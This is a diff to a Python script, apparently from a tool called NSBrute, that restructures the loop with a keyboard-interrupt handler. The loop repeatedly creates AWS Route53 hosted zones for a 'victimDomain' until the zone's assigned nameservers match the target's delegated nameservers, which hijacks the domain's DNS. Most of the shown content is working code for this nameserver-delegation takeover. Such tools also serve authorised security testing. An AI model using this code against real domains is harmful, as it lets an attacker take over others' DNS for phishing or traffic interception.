@@ -112,37 +112,40 @@ conn = route53.connect(
 # 	i=i+1
 
 counter=0
-while True:
-	counter=counter+1
-	myPrint("Iteration Count: "+str(counter),"INFO_WS")
-	try: 
-		new_zone=0
-		new_zone, change_info = conn.create_hosted_zone(
-	    victimDomain, comment='created by NSBrute during testing.'
-		)
-		#Erroneous Condition
-		if new_zone is None:
+try:	
+	while True:
+		counter=counter+1
+		myPrint("Iteration Count: "+str(counter),"INFO_WS")
+		try: 
+			new_zone=0
+			new_zone, change_info = conn.create_hosted_zone(
+		    victimDomain, comment='created by NSBrute during testing.'
+			)
+			#Erroneous Condition
+			if new_zone is None:
+				continue
+			nsAWS=new_zone.nameservers
+			myPrint("Created a new zone with following NS: ","INFO_WS")
+			myPrint("".join(nsAWS),"INFO_WS")
+			intersection=set(nsAWS).intersection(set(targetNS))
+			if(len(intersection)==0):
+				myPrint("No common NS found, deleting new zone","ERROR")
+				print ""
+				new_zone.delete()
+			else:
+				successful_zone_id = new_zone.id
+				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
+				myPrint("Check your AWS account, the work is done!","SECURE")
+				print ""
+				break
+		except Exception as e:
+			myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
+			myPrint("Trying Again!","ERROR")
+			if new_zone != 0:
+				new_zone.delete()
 			continue
-		nsAWS=new_zone.nameservers
-		myPrint("Created a new zone with following NS: ","INFO_WS")
-		myPrint("".join(nsAWS),"INFO_WS")
-		intersection=set(nsAWS).intersection(set(targetNS))
-		if(len(intersection)==0):
-			myPrint("No common NS found, deleting new zone","ERROR")
-			print ""
-			new_zone.delete()
-		else:
-			successful_zone_id = new_zone.id
-			myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
-			myPrint("Check your AWS account, the work is done!","SECURE")
-			print ""
-			break
-	except Exception as e:
-		myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
-		myPrint("Trying Again!","ERROR")
-		if new_zone != 0:
-			new_zone.delete()
-		continue
-
-if forceDelete:
-	force_delete_zones(successful_zone_id)
+except KeyboardInterrupt:
+	if forceDelete:
+		force_delete_zones(successful_zone_id)
+	else:
+		exit()
